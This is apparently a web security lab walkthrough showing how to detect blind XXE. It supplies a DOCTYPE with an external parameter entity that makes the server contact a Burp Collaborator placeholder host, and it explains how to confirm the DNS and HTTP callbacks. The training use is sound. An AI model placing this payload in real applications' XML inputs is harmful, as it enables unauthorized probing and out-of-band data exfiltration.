Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

`<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`

Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
